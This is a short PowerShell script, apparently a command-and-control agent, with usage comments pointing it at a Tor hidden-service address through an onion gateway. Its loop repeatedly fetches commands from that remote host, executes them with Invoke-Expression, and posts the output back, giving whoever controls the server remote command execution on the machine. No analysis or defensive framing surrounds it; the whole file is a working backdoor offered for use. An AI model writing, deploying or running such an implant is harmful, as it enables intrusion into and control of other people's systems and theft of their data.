# Usage: powershell -noexit "& ""agent.ps1 -Uri http://ONION.EXT"""
# E.G powershell -noexit "& ""agent.ps1 -Uri http://http://mipzy2bandglnot3tatof5jtjwva3elrinmfegdyfhx2ftkuj3zrnhad.onion.pet"""

param (
    [string]$Uri
)

while ($true) {
    $cmd = Invoke-WebRequest -Uri $uri
    $output = Invoke-Expression $cmd."Content"
    Invoke-WebRequest -Uri $uri -Method POST -Body $output
    Start-Sleep -Seconds 5
}